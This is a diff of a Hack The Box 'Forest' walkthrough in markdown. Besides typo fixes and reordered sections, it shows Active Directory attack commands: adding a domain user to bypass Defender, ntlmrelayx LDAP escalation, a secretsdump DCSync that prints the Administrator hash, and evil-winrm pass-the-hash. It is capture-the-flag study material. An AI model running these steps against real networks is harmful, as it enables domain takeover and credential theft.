@@ -109,7 +109,7 @@ Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds
 ```
 
 ### DNS
-`htb.local` as the nmap resutl
+`htb.local` as the nmap result
 
 ```
 dig @$IP htb.local
@@ -238,7 +238,7 @@ Alternatively, use BloodHound.py
 
 ##### Clean up by del the share
 `net use /d \\10.10.16.2\share`
-s3rvice
+
 ### Dive in BloodHound
 1. Start the current user as owned.
 2. Query "Find Shortest Paths to Domain Admins"
@@ -278,8 +278,8 @@ Or try again above commands. The `Add-DomainGroupMember` access denied. `Add-Dom
 So, looks like tt will fail as defender stop importing the script(PowerView.ps1) here.
 
 ### Follow the video from ippsec as it's more clear for what's happening here
-##### Below two commands equal to the "First Step". Bypass the blocked importing of PowerView.ps1
-1. Create a user that natively belong to ACCOUNT OPERATORS 
+##### Below are two commands equal to the "First Step". Bypass the blocked importing of PowerView.ps1
+1. Create a user that natively belongs to ACCOUNT OPERATORS 
 ```
 net user alvin s3rvice /add /domain
 ```
@@ -442,16 +442,7 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSy
 [+] Success!
 ```
 
-### Life saver ntlmrelayx.py if none of them working
-```bash
-python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --escalate-user svc-alfresco
-
-# It actually runs aclpwn.py aclpwn-20211009-001222.restore 
-```
-Although, i did run it twice to make it work
-https://rootinjail.com/blog/post/htb-forest/
-
-### Root
+##### rerun
 ```bash
 impacket-secretsdump -just-dc svc-alfresco:s3rvice@10.129.232.105
 
@@ -460,3 +451,13 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 
 evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i $IP
 ```
+
+### Life saver ntlmrelayx.py if none of them working
+```bash
+python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t ldap://$IP --escalate-user svc-alfresco
+
+# It actually runs aclpwn.py aclpwn-20211009-001222.restore 
+```
+Although, i did run it twice to make it work
+https://rootinjail.com/blog/post/htb-forest/
+Above link show all of three ways to root.
